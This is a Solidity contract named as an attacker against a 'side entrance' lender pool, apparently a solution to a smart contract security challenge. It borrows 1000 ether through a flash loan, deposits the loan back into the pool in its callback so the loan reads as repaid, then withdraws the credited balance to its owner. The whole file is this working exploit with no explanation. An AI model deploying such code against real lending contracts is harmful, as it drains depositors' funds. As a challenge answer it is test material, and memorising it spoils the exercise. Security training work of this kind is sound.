// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SideEntranceLenderPoolAttacker {

  address immutable owner;
  address immutable target;
  
  constructor(address payable _target) {
    target = _target;
    owner = msg.sender;
  }

  function attack() external {
    (bool success,) = target.call(
      abi.encodeWithSignature("flashLoan(uint256)", 1000 ether)
    );

    require(success, "flashloan fail");
  }

  function withdrawFromTarget() internal {
    (bool success,) = target.call(
      abi.encodeWithSignature("withdraw()")
    );

    require(success, "withdraw failed");
  }

  function execute() external payable {
    (bool success,) = payable(target).call{value: 1000 ether}(
      abi.encodeWithSignature("deposit()")
    );

    require(success, "execute failed");
  }

  function withdraw() external {
    require(owner == msg.sender, "nop");

    withdrawFromTarget();

    uint256 balance = address(this).balance;
    
    require(balance > 0, "empty");
    
    payable(owner).transfer(balance);
  }

  receive() external payable {}
}